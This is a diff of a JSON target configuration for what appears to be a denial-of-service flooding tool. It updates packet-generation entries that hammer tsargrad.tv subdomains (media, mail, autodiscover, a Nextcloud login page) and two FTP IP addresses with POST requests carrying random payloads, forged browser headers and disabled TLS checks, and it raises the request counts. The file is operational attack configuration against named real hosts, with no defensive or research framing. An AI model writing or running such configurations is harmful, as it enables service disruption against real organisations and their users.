@@ -8,17 +8,14 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
-            "name": "https://media.tsargrad.tv",
+            "count": 33,
+            "name": "http://autodiscover.tsargrad.tv",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "media.tsargrad.tv:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "autodiscover.tsargrad.tv:80"
                     }
                 },
                 "packet": {
@@ -26,7 +23,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://media.tsargrad.tv",
+                            "path": "http://autodiscover.tsargrad.tv",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +36,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://media.tsargrad.tv",
-                                "Referer": "https://media.tsargrad.tv",
-                                "X-Forwarded-Host": "media.tsargrad.tv",
+                                "Origin": "http://autodiscover.tsargrad.tv",
+                                "Referer": "http://autodiscover.tsargrad.tv",
+                                "X-Forwarded-Host": "autodiscover.tsargrad.tv",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,17 +49,14 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
-            "name": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
+            "count": 33,
+            "name": "http://mail.tsargrad.tv",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cloud.tsargrad.tv:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "mail.tsargrad.tv:80"
                     }
                 },
                 "packet": {
@@ -70,7 +64,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
+                            "path": "http://mail.tsargrad.tv",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -83,9 +77,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
-                                "Referer": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
-                                "X-Forwarded-Host": "cloud.tsargrad.tv",
+                                "Origin": "http://mail.tsargrad.tv",
+                                "Referer": "http://mail.tsargrad.tv",
+                                "X-Forwarded-Host": "mail.tsargrad.tv",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -96,48 +90,7 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
-            "name": "http://media.tsargrad.tv",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "media.tsargrad.tv:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://media.tsargrad.tv",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://media.tsargrad.tv",
-                                "Referer": "http://media.tsargrad.tv",
-                                "X-Forwarded-Host": "media.tsargrad.tv",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 31,
+            "count": 33,
             "name": "https://mail.tsargrad.tv",
             "args": {
                 "connection": {
@@ -181,14 +134,55 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
-            "name": "https://autodiscover.tsargrad.tv",
+            "count": 33,
+            "name": "http://media.tsargrad.tv",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "autodiscover.tsargrad.tv:443",
+                        "address": "media.tsargrad.tv:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://media.tsargrad.tv",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://media.tsargrad.tv",
+                                "Referer": "http://media.tsargrad.tv",
+                                "X-Forwarded-Host": "media.tsargrad.tv",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 33,
+            "name": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "cloud.tsargrad.tv:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -199,7 +193,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://autodiscover.tsargrad.tv",
+                            "path": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -212,9 +206,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://autodiscover.tsargrad.tv",
-                                "Referer": "https://autodiscover.tsargrad.tv",
-                                "X-Forwarded-Host": "autodiscover.tsargrad.tv",
+                                "Origin": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
+                                "Referer": "https://cloud.tsargrad.tv/nextcloud/index.php/login",
+                                "X-Forwarded-Host": "cloud.tsargrad.tv",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -225,155 +219,7 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
-            "name": "https://tsargrad.tv ",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "tsargrad.tv :443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://tsargrad.tv ",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://tsargrad.tv ",
-                                "Referer": "https://tsargrad.tv ",
-                                "X-Forwarded-Host": "tsargrad.tv ",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 31,
-            "name": "tcp://217.77.108.19:21",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "217.77.108.19:21"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 31,
-            "name": "http://autodiscover.tsargrad.tv",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "autodiscover.tsargrad.tv:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://autodiscover.tsargrad.tv",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://autodiscover.tsargrad.tv",
-                                "Referer": "http://autodiscover.tsargrad.tv",
-                                "X-Forwarded-Host": "autodiscover.tsargrad.tv",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 31,
-            "name": "http://mail.tsargrad.tv",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "mail.tsargrad.tv:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://mail.tsargrad.tv",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://mail.tsargrad.tv",
-                                "Referer": "http://mail.tsargrad.tv",
-                                "X-Forwarded-Host": "mail.tsargrad.tv",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 31,
+            "count": 33,
             "name": "tcp://188.64.160.163:21",
             "args": {
                 "connection": {
@@ -395,7 +241,7 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
+            "count": 33,
             "name": "http://cloud.tsargrad.tv/nextcloud/index.php/login",
             "args": {
                 "connection": {
@@ -436,14 +282,17 @@
         },
         {
             "type": "packetgen",
-            "count": 31,
-            "name": "http://tsargrad.tv",
+            "count": 33,
+            "name": "https://media.tsargrad.tv",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "tsargrad.tv:80"
+                        "address": "media.tsargrad.tv:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
                     }
                 },
                 "packet": {
@@ -451,7 +300,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://tsargrad.tv",
+                            "path": "https://media.tsargrad.tv",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -464,9 +313,75 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://tsargrad.tv",
-                                "Referer": "http://tsargrad.tv",
-                                "X-Forwarded-Host": "tsargrad.tv",
+                                "Origin": "https://media.tsargrad.tv",
+                                "Referer": "https://media.tsargrad.tv",
+                                "X-Forwarded-Host": "media.tsargrad.tv",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 33,
+            "name": "tcp://217.77.108.19:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "217.77.108.19:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 33,
+            "name": "https://autodiscover.tsargrad.tv",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "autodiscover.tsargrad.tv:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://autodiscover.tsargrad.tv",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://autodiscover.tsargrad.tv",
+                                "Referer": "https://autodiscover.tsargrad.tv",
+                                "X-Forwarded-Host": "autodiscover.tsargrad.tv",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
